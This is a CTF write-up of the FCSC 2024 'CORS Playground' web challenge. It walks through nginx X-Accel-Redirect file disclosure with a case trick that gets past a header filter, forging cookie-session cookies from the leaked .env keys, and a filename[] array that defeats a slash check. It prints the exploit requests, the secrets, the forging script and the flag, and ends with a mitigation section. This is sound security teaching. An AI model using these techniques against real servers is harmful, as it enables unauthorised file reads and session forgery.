---
ctf: FCSC
title: CORS Playground
authors:
    - name: Mizu
      url: https://mizu.re/
description: Perplexed by CORS? Our CORS Playground is your ideal solution. This intuitive and sleek platform lets you effortlessly learn and experiment with CORS policies. Perfect for unraveling the complexities of secure cross-origin requests. Dive in and clarify your CORS concepts!
categories:
    - Web
difficulty: Easy
year: 2024
challengefiles: cors-playground
published: "2024-09-07"
---

# TL;DR<a id="TL;DR"></a>

    **- Challenge Setup:** **Node.js** server with **nginx** allows setting arbitrary response headers
    **- Key Discoveries:** **Nginx** processes `X-Accel-Redirect` header to gain arbitrary file read in workdir e.g. of `.env`
    **- Check Bypass:** Bypassed X- header restriction using case insensitivity (x-Accel-Redirect)
    **- Cookie Forgery:** Forged cookies with leaked server secrets to impersonate the internal user using session keys
    **- Check Bypass:** Bypassed filename `/` check by sending the filename as an array: `filename[]=/flag.txt`

# 1. Introduction<a id="introduction"></a>

The description might be a bit misleading at the beginning:

```
Perplexed by CORS?
Our CORS Playground is your ideal solution.
This intuitive and sleek platform lets you effortlessly learn and experiment with CORS policies.
Perfect for unraveling the complexities of secure cross-origin requests.
Dive in and clarify your CORS concepts!
```

Although **CORS** is both contained in the title and the description, this challenge is nothing about exploitation of **CORS** misconfigurations.

# 2. Reconnaissance<a id="reconnaissance"></a>

The challenge is about a **node.js** server being deployed together with **nginx**. By starting playing around with the application we are able to add any kinds of CORS-headers to the server response via the `/cors` endpoint appending the headers as url parameters:

![overview](ctf/writeups/fcsc/corsplayground/corsplayground.png "overview")

After having a look into the source code, this is not only about CORS-headers. You can set *any* kind of header for your request and the server response:

```javascript
app.all("/cors", (req, res) => {
    for (const [key, value] of Object.entries(req.query)) {
        if (key.includes("X-")) delete req.query[key]
    }
    res.set(req.query);
    if (req.session.user === "internal" && !req.query.filename?.includes("/")) {
        res.sendfile(req.query.filename || "app.js");
    } else {
        res.send("Hello World!");
    }
});
```

Moreover there are some constraints e.g. we are not allowed to use custom headers starting with `X-`. Having set an appropriate cookie with `session.user === "internal"` allows us to retrieve any file we wish - sounds highly interesting. Unfortunately we are also not allowed to have a `/` in our path. So it seems like we are not allowed to use absolute paths and are restricted to the directory `/usr/app` the application is running in. Having a look in the docker setup we see the `flag.txt` got some interesting permissions set:

```dockerfile
FROM nginx:alpine3.18-slim
WORKDIR /usr/app
COPY --chown=1337:1337 --chmod=400 ./src/nginx/nginx.conf /etc/nginx/nginx.conf
COPY --chown=1337:1337 --chmod=500 ./src/app/ /usr/app/
COPY --chown=1337:1337 --chmod=500 ./src/start.sh /start.sh
COPY --chown=root:root --chmod=444 ./src/flag.txt /flag.txt
RUN apk add --update --no-cache            \
    nodejs~=18                             \
    npm~=9.6                            && \
    npm install
USER 1337:1337
CMD ["/bin/sh", "/start.sh"]
```

Anyone is allowed to read the `/flag.txt` because of the `444` rights. But how can we even get a cookie? The server secrets for generating cookies via the `cookie-session` seem to be random, so to forge any cookies we would have to forge a valid signature and thus break the underlying cryptography.

# 3. Vulnerability Description<a id="vulnerability description"></a>

Setting arbitrary headers in the server responses already seems very phishy. At first this seems kina useless. The headers are not processed any further but only appended to the server response. But we still got **nginx** sitting between client and server, so maybe some headers are still processed by **nginx**? There is an interesting header called `X-Accel-Redirect`. Usually this header is used to indicate that a response should be redirected. But in our case we can abuse this header to serve arbitrary files via **nginx**.

# 4. Exploitation<a id="exploitation"></a>

The working directory of **nginx** is `/usr/app`. But before using the `X-Accel-Redirect` header we need to bypass the `key.includes("X-")` check preventing us from using custom headers. Luckily nginx is not case sensitive. Unfortunately **nginx** won't serve us any files that are not contained in `/use/app/*`. So we can't simply request the `../../flag.txt` via e.g. a path traversal. By requesting `GET /cors?x-Accel-Redirect=.env` we get access to the server secrets:

```http
HTTP/1.1 200 OK
Server: nginx/1.26.1
Date: Mon, 03 Feb 2025 21:48:30 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 150
Last-Modified: Mon, 08 Apr 2024 13:06:56 GMT
Connection: keep-alive
ETag: "6613ebf0-96"
Accept-Ranges: bytes

PORT=3000
KEY1=244f6308a26ad41dd8ebacf617282a7f3dc1cb6fec5fa7a03f1a907857295620
KEY2=c3f8b13c86454198e624813a8d480dd2a43ed5154e5b43f33eedfe962831bbf2
```

Now that we have the server secrets we can start forging cookies. For this I used a small **node.js** server generating the cookies for me:

```javascript
const express = require("express");
const cookieSession = require("cookie-session");
const app  = express();

const KEY1="244f6308a26ad41dd8ebacf617282a7f3dc1cb6fec5fa7a03f1a907857295620"
const KEY2="c3f8b13c86454198e624813a8d480dd2a43ed5154e5b43f33eedfe962831bbf2"

app.use(cookieSession({
    name: "session",
    keys: [KEY1, KEY2]
}));

app.get('/set-cookie', (req, res) => {
    req.session.user = 'internal';
    res.send('Cookie set and signed');
});

app.listen(3000, () => {
    console.log('Server running @ http://localhost:3000');
});
```

So by requesting `/set-cookie` we get:

```http
HTTP/1.1 304 Not Modified
X-Powered-By: Express
Set-Cookie: session=eyJ1c2VyIjoiaW50ZXJuYWwifQ==; path=/; httponly
Set-Cookie: session.sig=cQxHOJTjYH-ApCawTRwrQoXd9HA; path=/; httponly
ETag: W/"1b-eYZazkp0W5H4AV0mNeEdq7v8u6k"
Date: Mon, 03 Feb 2025 21:50:33 GMT
Connection: keep-alive
Keep-Alive: timeout=5
```

So we got our new cookie header `Cookie: session=eyJ1c2VyIjoiaW50ZXJuYWwifQ==; session.sig=cQxHOJTjYH-ApCawTRwrQoXd9HA` ready to exploit the application. Now we are able to request (almost) any files we want. For example `package.json`. The last obstacle is about bypassing the `includes("/")` check. In these kind of situations it is always worth it thinking about which assumptions the developer made when implementing such kind of checks. In this case the assumption is definitely that the `filename` url parameter is parsed as a string. What if we somehow manage to make this parameter something else than a string? Then the `includes` function would have a completely different meaning. Maybe you have already seen something like `GET /submit?selectedOptions[]=Option1&selectedOptions[]=Option3`. This is used when you are dealing with some **multi select fields**. **Express** will handle these kind of url parameters as arrays. Thus `includes` will have a different meaning than intended, leading to a bypass for this check. So by requesting `GET /cors?filename[]=/flag.txt` we get our well beloved flag:

```http
HTTP/1.1 200 OK
Server: nginx/1.26.1
Date: Mon, 03 Feb 2025 21:52:53 GMT
Content-Type: text/plain; charset=UTF-8
Content-Length: 71
Connection: keep-alive
X-Powered-By: Express
filename: /flag.txt
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Mon, 08 Apr 2024 13:06:56 GMT
ETag: W/"47-18ebdd1a180"

FCSC{692ee58458f81decea191104293b2cd00e7d96f287c0f693f9737fbb2bcf5f46}
```

So interesting enough the `res.sendfile` in the server code also accepts arrays.

# 5. Mitigation<a id="mitigation"></a>

The vulnerability is inherent to the design. The client should never be able to set arbitray response headers for the server. Moreover the checks trying to prevent exploitation are too lazy. In general using `includes` in security check is almost never a good idea because the match is too broad leading to bypasses.

# 6. Flag<a id="flag"></a>

FCSC{692ee58458f81decea191104293b2cd00e7d96f287c0f693f9737fbb2bcf5f46}
